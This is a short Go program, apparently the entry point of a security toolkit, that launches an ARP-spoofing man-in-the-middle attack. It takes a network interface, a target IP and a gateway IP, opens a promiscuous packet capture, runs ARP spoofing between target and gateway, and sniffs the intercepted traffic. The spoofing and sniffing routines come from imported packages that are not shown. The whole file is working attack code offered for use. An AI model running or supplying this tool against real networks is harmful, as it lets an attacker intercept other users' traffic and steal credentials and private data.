package main

import (
	"fmt"
	"github.com/google/gopacket/pcap"
	"github.com/zhangweijie11/zSec/sniffer/sniff_arp/arpspoof"
	"github.com/zhangweijie11/zSec/sniffer/sniff_arp/logger"
	"github.com/zhangweijie11/zSec/sniffer/sniff_arp/sniff"
	"os"
	"time"
)

var (
	snapshotLen int32 = 1024
	promiscuous bool  = true
	err         error
	timeout     time.Duration = pcap.BlockForever
	handle      *pcap.Handle

	DeviceName = "en0"
)

func main() {
	if len(os.Args) != 4 {
		fmt.Printf("%v deviceName target gateway\n", os.Args[0])
		os.Exit(0)
	}

	DeviceName = os.Args[1]
	target := os.Args[2]
	gateway := os.Args[3]

	handle, err = pcap.OpenLive(DeviceName, snapshotLen, promiscuous, timeout)
	if err != nil {
		logger.Log.Fatal(err)
	}
	defer handle.Close()

	go StartArp(handle, DeviceName, target, gateway)

	_ = sniff.StartSniff(handle)
}

func StartArp(handle *pcap.Handle, deviceName, target, gateway string) {
	arpspoof.ArpSpoof(deviceName, handle, target, gateway)
}
